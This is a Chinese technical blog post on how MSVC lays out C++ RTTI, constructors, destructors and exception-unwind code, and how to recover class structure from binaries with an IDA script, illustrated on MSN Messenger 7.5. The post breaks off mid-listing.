<h2 id="RTTI-的实现"><a href="#RTTI-的实现" class="headerlink" title="RTTI 的实现"></a>RTTI 的实现</h2><p><strong>RTTI</strong>（Run-Time Type Identification，<strong>运行时类型识别</strong>）是编译器为了支持 C++ 中 <code>dynamic_cast&lt;&gt;</code> 和 <code>typeid()</code> 两个操作符操作符以及 C++ 异常而生成的特殊编译信息。RTTI 的特性只有当类涉及<strong>多态</strong>的时候才会用到，比如类中声明了<strong>虚函数</strong>。</p>
<p>在类的内存布局中，MSVC 编译器会把一个指向 <strong><code>COL</code></strong>（Complete Object Locator，<strong>完整对象定位符</strong>）结构体的指针放在<strong>虚函数表</strong>之前。之所以叫<strong>完整对象定位符</strong>，是因为它允许编译器根据一个特定的<strong>虚函数表指针</strong>（一个类中可能有多个<strong>虚函数表指针</strong>）定位到整个对象。<strong>COL</strong>的结构定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> RTTICompleteObjectLocator</div><div class="line">&#123;</div><div class="line">    DWORD signature;  <span class="comment">// 一直为 0 ?</span></div><div class="line">    DWORD offset;       <span class="comment">// 改虚函数表在类中相对与类的起始地址的偏移量（offset of this vtable in the complete class）</span></div><div class="line">    DWORD cdOffset;   <span class="comment">// 构造函数偏移（constructor displacement offset）</span></div><div class="line">    <span class="keyword">struct</span> TypeDescriptor* pTypeDescriptor;  <span class="comment">// 整个类的类型描述符（TypeDescriptor of the complete class）</span></div><div class="line">    <span class="keyword">struct</span> RTTIClassHierarchyDescriptor* pClassDescriptor;  <span class="comment">// 类的继承关系描述结构（describes inheritance hierarchy）</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>RTTIClassHierarchyDescriptor</code> 描述整个类的继承关系，它对类的所有 <code>COL</code> 都是通用的。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> RTTIClassHierarchyDescriptor</div><div class="line">&#123;</div><div class="line">    DWORD signature;      <span class="comment">// 一直为 0 ?</span></div><div class="line">    DWORD attributes;     <span class="comment">//bit 0 set = 多重继承, bit 1 set = 虚继承</span></div><div class="line">    DWORD numBaseClasses; <span class="comment">// pBaseClassArray 中的基类数量（number of classes in pBaseClassArray）</span></div><div class="line">    <span class="keyword">struct</span> RTTIBaseClassArray* pBaseClassArray;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>Base Class Array</code> 定义了在执行 <code>_dynamic_cast_</code> 时<strong>派生类</strong>可以动态映射成的所有<strong>基类</strong>的信息，其中每一个<strong>基类描述符</strong>（Base Class Descriptor）的结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> RTTIBaseClassDescriptor</div><div class="line">&#123;</div><div class="line">    <span class="keyword">struct</span> TypeDescriptor* pTypeDescriptor; <span class="comment">// 类的类型描述符（type descriptor of the class）</span></div><div class="line">    DWORD numContainedBases; <span class="comment">// Base Class Array 中的基类数量（number of nested classes following in the Base Class Array）</span></div><div class="line">    <span class="keyword">struct</span> PMD where;        <span class="comment">// 内部成员偏移信息（pointer-to-member displacement info）</span></div><div class="line">    DWORD attributes;        <span class="comment">// 标志位, 通常置 0</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> PMD</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> mdisp;  <span class="comment">// 内部成员偏移（member displacement）</span></div><div class="line">    <span class="keyword">int</span> pdisp;  <span class="comment">// 虚函数表的偏移（vbtable displacement）</span></div><div class="line">    <span class="keyword">int</span> vdisp;  <span class="comment">// 虚函数表的内部偏移（displacement inside vbtable）</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><code>PMD</code> 结构描述一个<strong>基类</strong>在其<strong>派生类</strong>中的位置信息。<strong>简单继承</strong>的时候，<strong>基类</strong>相对于其<strong>派生类</strong>的<strong>偏移量</strong>是固定的，偏移量的值即 <code>_mdisp_</code> 的值；如果涉及到<strong>虚继承</strong>，就需要先从<strong>虚函数表</strong>中取出一个额外的偏移量一起计算出基类的偏移，在函数调用的时候则需要重新调整 <code>*this</code> 指针的值。整个过程的伪码示例如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//char* pThis; struct PMD pmd;</span></div><div class="line">pThis += pmd.mdisp;</div><div class="line"><span class="keyword">if</span> (pmd.pdisp != <span class="number">-1</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *vbtable = pThis + pmd.pdisp;</div><div class="line">  pThis += *(<span class="keyword">int</span>*)(vbtable + pmd.vdisp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>举例来说，文章开头 3 个类的继承关系中 RTTI 的信息图下图所示：</p>
<p><img src="/imgs/14936061421938.jpg" alt="示例l类中的 RTTI 继承关系"></p>
<h2 id="信息提取"><a href="#信息提取" class="headerlink" title="信息提取"></a>信息提取</h2><h3 id="1-RTTI"><a href="#1-RTTI" class="headerlink" title="1) RTTI"></a>1) RTTI</h3><p>如果存在 <strong>RTTI</strong>，那么 <strong>RTTI</strong> 能为逆向工作提供很多有价值的信息。根据 <strong>RTTI</strong>，我们可能还原<strong>类名</strong>、<strong>类的继承关系</strong>，甚至有时候能还原部分类的<strong>内存布局</strong>信息。在 <strong>附录 1</strong> 中，我写了一个 <strong>RTTI 信息扫描器</strong>，可以做进一步参考。</p>
<h3 id="2-静态初始化-和-全局初始化"><a href="#2-静态初始化-和-全局初始化" class="headerlink" title="2) 静态初始化 和 全局初始化"></a>2) 静态初始化 和 全局初始化</h3><p><strong>全局</strong>和<strong>静态</strong>的对象会在 <code>main()</code> 函数前面初始化。在 MSVC++ 中，编译器会为<strong>全局</strong>和<strong>静态</strong>函数生成相应的<strong>初始化器</strong>，并把他们的地址放在一个<strong>表</strong>（<code>table</code>）中，这个<strong>表</strong>会在 <code>_cinit()</code> 初始化 <strong>CRT</strong> 的时候生成。在 <strong>PE</strong> 结构中，这个<strong>表</strong>通常在 <code>.data</code> 段的起始位置。典型的初始化器结构示例如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">_init_gA1:</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, offset _gA1</div><div class="line">    <span class="keyword">call</span>    A::A()</div><div class="line">    <span class="keyword">push</span>    offset _term_gA1</div><div class="line">    <span class="keyword">call</span>    _atexit</div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">retn</span></div><div class="line"><span class="symbol">_term_gA1:</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, offset _gA1</div><div class="line">    <span class="keyword">call</span>    A::~A()</div><div class="line">    <span class="keyword">retn</span></div></pre></td></tr></table></figure>
<p>这样，从上面这个表里我们可以看出：</p>
<ul>
<li><strong>全局</strong>/<strong>静态</strong>对象的地址；</li>
<li>它们的<strong>构造函数</strong></li>
<li>它们的<strong>析构函数</strong></li>
</ul>
<p>更多细节可以参考 <code>_#pragma_directive_init_seg_</code> [5]。</p>
<h3 id="3-栈展开处理函数（Unwind-Funclets）"><a href="#3-栈展开处理函数（Unwind-Funclets）" class="headerlink" title="3) 栈展开处理函数（Unwind Funclets）"></a>3) 栈展开处理函数（Unwind Funclets）</h3><p>一个函数中生成任何<strong>动态</strong>的对象时，VC++ 编译器总会生成一个相关的异常处理结构，以便在遇到异常时进行栈展开、销毁该动态对象。VC++ 中异常处理的底层细节可以参考本系列前一篇。典型的 <code>Unwind Funclets</code> 结构如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">unwind_1tobase:</span>  <span class="comment">; state 1 -&gt; -1</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">jmp</span>     A::~A()</div></pre></td></tr></table></figure>
<p>通过在函数体中寻找相反的状态变化，或者在第一次访问栈中的同一个变量，我们也可以找到其<strong>构造函数</strong>：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line"><span class="keyword">call</span>    A::A()</div><div class="line"><span class="keyword">mov</span>     [<span class="built_in">ebp</span>+__$EHRec$.state], <span class="number">1</span></div></pre></td></tr></table></figure>
<p>对与那些用 <code>new()</code> 方法创建的对象，<strong>栈展开处理函数</strong> 保证即使在析构函数失效的情况下，也能删除掉分配给这些对象的内存：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">unwind_0tobase:</span> <span class="comment">; state 0 -&gt; -1</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+pA1]</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">    <span class="keyword">call</span>    operator delete(void *)</div><div class="line">    <span class="keyword">pop</span>     <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">retn</span></div></pre></td></tr></table></figure>
<p>在函数体中：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">;A* pA1 = new A();</span></div><div class="line">    <span class="keyword">push</span></div><div class="line">    <span class="keyword">call</span>    operator new(uint)</div><div class="line">    <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+pA1], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+__$EHRec$.state], <span class="number">0</span><span class="comment">; state 0: memory allocated but object is not yet constructed</span></div><div class="line">    <span class="keyword">jz</span>      short @@new_failed</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">call</span>    A::A()</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">jmp</span>     short @@constructed_ok</div><div class="line"></div><div class="line">@@new_failed:</div><div class="line">    <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span></div><div class="line"></div><div class="line">@@constructed_ok:</div><div class="line">    <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">14h</span>+__$EHRec$.state], -<span class="number">1</span></div><div class="line"><span class="comment">;state -1: either object was constructed successfully or memory allocation failed</span></div><div class="line"><span class="comment">;in both cases further memory management is done by the programmer</span></div></pre></td></tr></table></figure>
<p>另一种形式的 <strong>栈展开处理函数</strong> 存在于<strong>构造函数</strong> 和 <strong>析构函数</strong> 中，它将保证在程序遇到异常时销毁对象成员。这种情况下的 <strong>栈展开处理函数</strong> 使用的是保存在栈变量中的 <code>_this_</code> 指针：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">unwind_2to1:</span></div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+_this] <span class="comment">; state 2 -&gt; 1</span></div><div class="line">    <span class="keyword">add</span>     <span class="built_in">ecx</span>, <span class="number">4Ch</span></div><div class="line">    <span class="keyword">jmp</span>     B1::~B1</div></pre></td></tr></table></figure>
<p>上面这个例子中，<strong>栈展开处理函数</strong> 销毁了 <code>B1</code> 在偏移 <code>0x4c</code> 处的成员。总的来说，通过 <strong>栈展开处理函数</strong>，我们可以获取一下信息：</p>
<ul>
<li>栈中保存的通过 <code>_operator_new_</code> 创建的 C++ 对象，或指向对象的指针；</li>
<li>类的构造函数；</li>
<li>类的析构函数；</li>
<li><code>new()</code> 创建出来的对象的 <code>size</code>。</li>
</ul>
<h3 id="4-递归构造-析构函数"><a href="#4-递归构造-析构函数" class="headerlink" title="4) 递归构造/析构函数"></a>4) 递归构造/析构函数</h3><p>这个规则很简单：<strong>递归构造函数</strong>递归地调用其他构造函数（比如基类的构造函数、其他成员的构造函数）；<strong>递归析构函数</strong> 递归地调用他们所有的析构函数。典型的<strong>构造函数</strong>具有以下功能：</p>
<ul>
<li>调用基类的构造函数；</li>
<li>调用其他嵌套对象所属类的构造函数；</li>
<li>如果类中声明了<strong>虚函数</strong>，则初始化<strong>虚函数表指针</strong>（ <code>vfptr</code> ）；</li>
<li>执行程序员定义的<strong>构造函数</strong>函数体。</li>
</ul>
<p>典型的<strong>析构函数</strong>则具有相对应的以下功能：</p>
<ul>
<li>如果类中声明了<strong>虚函数</strong>，则初始化<strong>虚函数表指针</strong>（ <code>vfptr</code> ）；</li>
<li>执行程序员定义的<strong>析构函数</strong>函数体；</li>
<li>调用其他嵌套对象所属类的析构函数</li>
<li>调用基类的析构函数。</li>
</ul>
<p>不过， MSVC 编译器创建的 <strong>析构函数</strong> 还有一个特性：<code>_state_</code> 以<strong>最大值</strong>初始化，并随着对成员对象的析构行为而递减。这样一来反而方便分析析构函数的执行。另外需要注意的是，在 MSVC 中，简单的 构造/析构函数通常是以内联形式存在的，所以经常会在同一个函数中看到<strong>虚函数表指针</strong>被不同指针重复调用。</p>
<h3 id="5-数组构造与析构"><a href="#5-数组构造与析构" class="headerlink" title="5) 数组构造与析构"></a>5) 数组构造与析构</h3><p>MSVC 用辅助函数来完成一个对象数组的构造与析构。用以下代码为例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A* pA = <span class="keyword">new</span> A[n];</div><div class="line"><span class="keyword">delete</span> [] pA;</div></pre></td></tr></table></figure>
<p>用 C++ 伪码详细还原一下，大概如下所示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">array = new char(sizeof(A)*n+sizeof(int))</div><div class="line">if (array)</div><div class="line">&#123;</div><div class="line">  *(int*)array=n; //store array size in the beginning</div><div class="line">  'eh vector constructor iterator'(array+sizeof(int),sizeof(A),count,&amp;A::A,&amp;A::~A);</div><div class="line">&#125;</div><div class="line">pA = array;</div><div class="line"></div><div class="line">'eh vector destructor iterator'(pA,sizeof(A),count,&amp;A::~A);</div></pre></td></tr></table></figure>
<p>如果 <code>A</code> 包含虚函数，删除对象数组的时候会调用一个 <code>vector deleting destructor</code> ：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">;pA-&gt;'vector deleting destructor'(3);</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, pA</div><div class="line"><span class="keyword">push</span> <span class="number">3</span> <span class="comment">; flags: 0x2=deleting an array, 0x1=free the memory</span></div><div class="line"><span class="keyword">call</span> A::<span class="string">'vector deleting destructor'</span></div></pre></td></tr></table></figure>
<p>如果 <code>A</code> 的<strong>析构函数</strong>是个<strong>虚函数</strong>，那么析构的时候会以调用虚函数的方式调用析构函数：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, pA</div><div class="line"><span class="keyword">push</span> <span class="number">3</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ecx</span>] <span class="comment">;fetch vtable pointer</span></div><div class="line"><span class="keyword">call</span> [<span class="built_in">eax</span>]     <span class="comment">;call deleting destructor</span></div></pre></td></tr></table></figure>
<p>因此，通常来说通过构造/析构的数组迭代调用，我们可以发掘以下信息：</p>
<ul>
<li>对象数组的地址；</li>
<li>数组里各对象的构造函数；</li>
<li>数组里各对象的析构函数；</li>
<li>类的 <code>size</code>。</li>
</ul>
<h3 id="6-删除析构函数（-deleting-destructor-）"><a href="#6-删除析构函数（-deleting-destructor-）" class="headerlink" title="6) 删除析构函数（ deleting destructor ）"></a>6) 删除析构函数（ <code>deleting destructor</code> ）</h3><p>当类中含有<strong>虚析构函数</strong>（ <code>virtual destructor</code> ）时，编译器会生成一个辅助函数——<strong>删除析构函数</strong>，这样便能确保销毁一个类实例的时候合适的 <code>_operator delete_</code> 被调用。<strong>删除析构函数</strong> 的伪码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">virtual void * A::'scalar deleting destructor'(uint flags)</div><div class="line">&#123;</div><div class="line">  this-&gt;~A();</div><div class="line">  if (flags&amp;1) A::operator delete(this);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>该函数的地址会被放在<strong>虚函数表</strong>( <code>vftable</code>) 中，并覆盖原有的析构函数地址。这样一来，如果另外一个类覆盖了这个虚析构函数，那么它的 <code>_delete_</code> 将被调用。然而实际代码中 <code>_delete_</code> 几乎不会被覆盖，所以你通常只看到调用默认的delete()。有时候，编译器也生成一个删除析构函数向量，伪码示例如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">virtual void * A::'vector deleting destructor'(uint flags)</div><div class="line">&#123;</div><div class="line">  if (flags&amp;2) //删除一个数组（destructing a vector）</div><div class="line">  &#123;</div><div class="line">    array = ((int*)this)-1; //数组大小存于此指针前面（array size is stored just before the this pointer）</div><div class="line">    count = array[0];</div><div class="line">    'eh vector destructor iterator'(this,sizeof(A),count,A::~A);</div><div class="line">    if (flags&amp;1) A::operator delete(array);</div><div class="line">  &#125;</div><div class="line">  else &#123;</div><div class="line">    this-&gt;~A();</div><div class="line">    if (flags&amp;1) A::operator delete(this);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>我忽略了大部分涉及虚基类的类的实现细节，因为它们是在太复杂，而且在现实生活中很少用到。请参考 Jan Gray 的文章[1]，它非常相近（请忽略那看着脑仁疼的匈牙利命名法）。文章[2]描述了一个MSVC实现虚继承的实现。更多细节还可以看 MS 专利[3]。</p>
<h2 id="附录-1：-ms-rtti4-idc"><a href="#附录-1：-ms-rtti4-idc" class="headerlink" title="附录 1： ms_rtti4.idc"></a>附录 1： <code>ms_rtti4.idc</code></h2><p>这是我为解析 <strong>RTTI</strong> 和<strong>虚函数表</strong>写的一个 IDA 脚本，读者可以从 <a href="http://www.openrce.org/downloads/details/196" target="_blank" rel="external"> Microsoft VC++ Reversing Helpers</a> 下载到该脚本以及本系列两篇文章。该脚本的功能特性有以下几个：</p>
<ul>
<li>解析 <strong>RTTI</strong> 结构、用相应的类名重命名<strong>虚函数表</strong>；</li>
<li>在相对简单的分析工作中重命名<strong>构造函数</strong>与<strong>析构函数</strong>；</li>
<li>把所有的<strong>虚函数表</strong>以及<strong>引用函数</strong>和类的继承关系输出到文件中。</li>
</ul>
<blockquote>
<p><strong>Usage</strong>：<br>IDA 的初始化分析结束之后，载入 <code>ms_rtti4.idc</code> ，它会询问你是否要扫描 PE 文件中的<strong>虚函数表</strong>（vftables)。需要注意的是，这个过程可能需要比较长的时间。如果你选择跳过扫描，后续仍然可以手动解析<strong>虚函数表</strong>。如果你选择让脚本帮你执行扫描，脚本会识别 PE 文件中所有使用 <strong>RTTI</strong> 的<strong>虚函数表</strong>，并且会重命名<strong>虚函数表</strong>、识别和重命名构造/析构函数。也有可能脚本会解析失败，尤其是涉及到<strong>虚继承</strong>的情况。扫描结束后，脚本会自动打开存放扫描结果的文件。</p>
</blockquote>
<p>另外，脚本载入以后，可以使用以下 <strong>快捷键</strong> 来对 MSVC 生成的结构进行手动解析：</p>
<ul>
<li><strong><code>Alt+F8</code></strong>：解析一个<strong>虚函数表。游标应该会停在虚函数表的起始位置。如果里面用到了 </strong>RTTI<strong>，脚本会使用里面的类名来重命名虚函数表。如果没有涉及到 </strong>RTTI<strong>，你可以手动输入类名来自定义。如果脚本扫描到了</strong>虚析构函数**，一样也会把它重命名。</li>
<li><p><strong><code>Alt+F7</code></strong>：解析 <code>FuncInfo</code> 结构。<code>FuncInfo</code> 是一个描述在栈上创建对象或使用异常处理句柄的函数信息的结构。它的地址在异常处理句柄中通常被解析为 <code>_CxxFrameHandler</code> ：</p>
  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, offset FuncInfo1</div><div class="line"><span class="keyword">jmp</span> _CxxFrameHandler</div></pre></td></tr></table></figure>
<p>  多数情况下它会被 IDA 直接识别并解析，但是我提供的脚本可以解析出更多的信息，你可以用 <code>ms_ehseh.idc</code> 解析文件中的所有 <code>FuncInfo</code> 。<br>  游标放到 <code>FuncInfo</code> 起始位置的，此快捷键有效。</p>
</li>
<li><p><strong><code>Alt+F9</code></strong>：解析 <code>throw</code> 信息。<code>Throw info</code> 是 <code>_CxxThrowException</code> 在实现 <code>_throw</code> 操作符时用到的辅助结构，它通常作为 <code>_CxxThrowException</code> 的第二个参数被调用：</p>
  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+e]</div><div class="line"><span class="keyword">call</span>    E::E()</div><div class="line"><span class="keyword">push</span>    offset ThrowInfo_E</div><div class="line"><span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+e]</div><div class="line"><span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line"><span class="keyword">call</span>    _CxxThrowException</div></pre></td></tr></table></figure>
<p>  游标放在 <code>throw info</code> 起始位置的时候次快捷键才有效。该脚本会解析 <code>throw info</code> 并为调用 <code>throw</code> 操作符的类添加注释。它还可以识别和重命名异常的析构函数和拷贝构造函数。</p>
</li>
</ul>
<h2 id="附录-2：实战恢复一个类的结构"><a href="#附录-2：实战恢复一个类的结构" class="headerlink" title="附录 2：实战恢复一个类的结构"></a>附录 2：实战恢复一个类的结构</h2><p>我们练手的对象是 <code>MSN Messenger 7.5</code> （ <code>msnmsgr.exe</code>  版本是 <code>7.5.324.0</code> , 大小 7094272 Bytes ），它主要由 C++ 实现，并且里面用到了很多 <strong>RTTI</strong> 的结构，正符合我们的需求。先看一下位于 <code>.0040EFD8</code> 和 <code>.0040EFE0</code> 的两处<strong>虚函数表</strong>。其中完整的 RTTI 结构及其继承关系如下所示：<br><img src="/imgs/14938199737802.jpg" alt="RTTI hierarchy for MSN Messenger 7.5"></p>
<p>这样一来，就有了两个<strong>虚函数表</strong>属于同一个<strong>类</strong> —— <code>CContentMenuItem</code> ，再看它们的<strong>基类描述符</strong>我们可以发现：</p>
<ul>
<li><code>CContentMenuItem</code> 里面包含 3 个<strong>基类</strong> —— <code>CDownloader</code>/<code>CNativeEventSink</code>/<code>CNativeEventSource</code>;</li>
<li><code>CDownloader</code> 包含 1 个<strong>基类</strong> —— <code>CNativeEventSink</code>；</li>
<li>因此 <code>CContentMenuItem</code> 继承自 <code>CDownloader</code> 和 <code>CNativeEventSource</code>，而 <code>CDownloader</code> 继承自 <code>CNativeEventSink</code>；</li>
<li><code>CDownloader</code> 位于整个对象的起始位置，<code>CNativeEventSource</code> 则位于偏移为 <code>0x24</code> 的位置。</li>
</ul>
<p><img src="/imgs/14938205753585.jpg" alt=""></p>
<p>据此，我们可以得出这么一个结论：第一个<strong>虚函数表</strong>列出了 <code>CNativeEventSource</code> 里的方法，第二个<strong>虚函数表</strong>列出了 <code>CDownloader</code> 或者 <code>CNativeEventSink</code> 里的方法（如果这两者都不是，<code>CContentMenuItem</code> 会重用 <code>CNativeEventSource</code> 的<strong>虚函数表</strong>）。我们再来看都有谁引用了这两个<strong>虚函数表</strong>，它们<strong>都</strong>被位于 <code>.052B5E0</code> 和 <code>.052B547</code> 的两个函数引用（这样进一步印证了它们属于同一个<strong>类</strong>）。如果我们仔细查看 <code>.052B547</code> 处函数的开头，可以发现 <code>_state_</code> 被初始化为 <code>6</code>，这表明该函数是一个 <strong>析构函数</strong>；由于一个类只能有 1 个析构函数，我们可以推断 <code>.052B5E0</code> 处的函数是一个<strong>构造函数</strong>：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">CContentMenuItem:</span>:CContentMenuItem   proc <span class="built_in">near</span></div><div class="line">this = <span class="built_in">esi</span></div><div class="line">    <span class="keyword">push</span>    this</div><div class="line">    <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">    <span class="keyword">mov</span>     this, <span class="built_in">ecx</span></div><div class="line">    <span class="keyword">call</span>    sub_4CA77A</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">edi</span>, [this+<span class="number">24h</span>]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">edi</span></div><div class="line">    <span class="keyword">call</span>    sub_4CBFDB</div><div class="line">    <span class="keyword">or</span>      <span class="built_in">dword</span> <span class="built_in">ptr</span> [this+<span class="number">48h</span>], <span class="number">0FFFFFFFFh</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">4Ch</span>]</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [this], offset const CContentMenuItem::<span class="string">'vftable'</span>&#123;for <span class="string">'CContentMenuItem'</span>&#125;</div><div class="line">    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>], offset const CContentMenuItem::<span class="string">'vftable'</span>&#123;for <span class="string">'CNativeEventSource'</span>&#125;</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">50h</span>]</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">54h</span>]</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">58h</span>]</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [this+<span class="number">5Ch</span>]</div><div class="line">    <span class="keyword">call</span>    sub_4D8000</div><div class="line">    <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+<span class="number">64h</span>], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+<span class="number">68h</span>], <span class="built_in">eax</span></div><div class="line">    <span class="keyword">mov</span>     [this+<span class="number">6Ch</span>], <span 